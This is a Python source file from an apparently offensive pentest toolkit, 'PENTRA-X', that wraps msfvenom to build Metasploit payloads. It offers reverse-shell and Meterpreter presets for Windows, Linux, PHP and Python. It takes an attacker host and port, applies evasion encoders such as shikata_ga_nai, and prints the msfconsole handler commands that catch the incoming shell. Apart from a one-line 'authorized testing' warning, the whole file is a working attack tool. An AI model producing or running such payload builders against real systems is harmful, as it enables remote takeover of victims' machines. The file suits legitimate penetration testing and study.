#!/usr/bin/env python3
"""
PENTRA-X MSFvenom Wrapper
Generate Metasploit payloads using msfvenom.
"""

import subprocess
import os
from typing import Optional

from ...core.colors import Colors, success, error, info, warning, header
from ...core.utils import safe_input, safe_press_enter, check_tool_installed
from ...core.logging import get_logger, log_result


# Common payload presets
PAYLOAD_PRESETS = {
    '1': ('Windows Meterpreter Reverse TCP', 'windows/meterpreter/reverse_tcp', 'exe'),
    '2': ('Windows Shell Reverse TCP', 'windows/shell_reverse_tcp', 'exe'),
    '3': ('Linux Meterpreter Reverse TCP', 'linux/x86/meterpreter/reverse_tcp', 'elf'),
    '4': ('Linux Shell Reverse TCP', 'linux/x86/shell_reverse_tcp', 'elf'),
    '5': ('PHP Meterpreter Reverse TCP', 'php/meterpreter_reverse_tcp', 'php'),
    '6': ('Python Meterpreter Reverse TCP', 'python/meterpreter_reverse_tcp', 'py'),
    '7': ('Windows x64 Meterpreter', 'windows/x64/meterpreter/reverse_tcp', 'exe'),
    '8': ('Custom payload', None, None),
}


def msfvenom_generate() -> Optional[str]:
    """
    Generate payload using msfvenom.
    
    Returns:
        Path to generated payload or None
    """
    logger = get_logger()
    
    header("MSFvenom Payload Generator")
    
    # Check installation
    if not check_tool_installed('msfvenom'):
        error("msfvenom is not installed")
        info("Install Metasploit Framework")
        safe_press_enter()
        return None
    
    warning("Use only for authorized testing!")
    
    # Get LHOST and LPORT
    lhost = safe_input(f"{Colors.OKGREEN}Enter LHOST (your IP): {Colors.ENDC}")
    if not lhost:
        error("LHOST required")
        safe_press_enter()
        return None
    lhost = lhost.strip()
    
    lport = safe_input(f"{Colors.OKGREEN}Enter LPORT (default 4444): {Colors.ENDC}") or '4444'
    try:
        lport = int(lport.strip())
    except ValueError:
        lport = 4444
    
    # Select payload
    print(f"\n{Colors.OKCYAN}Select payload:{Colors.ENDC}")
    for key, (name, _, _) in PAYLOAD_PRESETS.items():
        print(f"  {Colors.OKCYAN}{key}.{Colors.ENDC} {name}")
    print(f"  {Colors.OKCYAN}0.{Colors.ENDC} Back")
    
    choice = safe_input(f"\n{Colors.OKGREEN}Select payload: {Colors.ENDC}")
    if choice is None or choice == '0':
        return None
    
    if choice not in PAYLOAD_PRESETS:
        error("Invalid selection")
        safe_press_enter()
        return None
    
    name, payload, format_ext = PAYLOAD_PRESETS[choice]
    
    if payload is None:
        # Custom payload
        payload = safe_input(f"{Colors.OKGREEN}Enter payload (e.g., windows/meterpreter/reverse_tcp): {Colors.ENDC}")
        if not payload:
            error("Payload required")
            safe_press_enter()
            return None
        format_ext = safe_input(f"{Colors.OKGREEN}Output format (exe/elf/raw/php/py): {Colors.ENDC}") or 'raw'
    
    # Output filename
    default_output = f"payload_{format_ext}.{format_ext}"
    output = safe_input(f"{Colors.OKGREEN}Output file (default: {default_output}): {Colors.ENDC}")
    output = output.strip() if output else default_output
    
    # Encoder option
    use_encoder = safe_input(f"{Colors.OKGREEN}Use encoder? (y/N): {Colors.ENDC}")
    encoder = None
    if use_encoder and use_encoder.lower() == 'y':
        print(f"\n{Colors.OKCYAN}Common encoders:{Colors.ENDC}")
        print("  1. x86/shikata_ga_nai")
        print("  2. x64/xor")
        print("  3. php/base64")
        enc_choice = safe_input(f"{Colors.OKGREEN}Select encoder (or enter custom): {Colors.ENDC}")
        
        encoders = {'1': 'x86/shikata_ga_nai', '2': 'x64/xor', '3': 'php/base64'}
        encoder = encoders.get(enc_choice, enc_choice if enc_choice else None)
    
    # Build command
    cmd = [
        'msfvenom',
        '-p', payload,
        f'LHOST={lhost}',
        f'LPORT={lport}',
        '-f', format_ext,
        '-o', output
    ]
    
    if encoder:
        cmd.extend(['-e', encoder])
    
    info(f"Generating: {name}")
    info(f"Command: {' '.join(cmd)}")
    
    logger.tool_start("MSFvenom", f"{payload} -> {output}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print(result.stderr)
        
        if os.path.exists(output):
            file_size = os.path.getsize(output)
            success(f"Payload generated: {output} ({file_size} bytes)")
            
            # Handler info
            print(f"\n{Colors.OKCYAN}Start handler in msfconsole:{Colors.ENDC}")
            print(f"  use exploit/multi/handler")
            print(f"  set payload {payload}")
            print(f"  set LHOST {lhost}")
            print(f"  set LPORT {lport}")
            print(f"  exploit")
            
            log_result("msfvenom", f"Generated: {output} ({payload})")
            logger.tool_end("MSFvenom", success=True)
            
            safe_press_enter()
            return output
        else:
            error("Payload generation failed")
            logger.tool_end("MSFvenom", success=False)
            safe_press_enter()
            return None
            
    except subprocess.TimeoutExpired:
        error("Generation timed out")
        logger.tool_end("MSFvenom", success=False)
        safe_press_enter()
        return None
    except Exception as e:
        error(f"Generation failed: {e}")
        logger.tool_end("MSFvenom", success=False)
        safe_press_enter()
        return None


if __name__ == "__main__":
    msfvenom_generate()
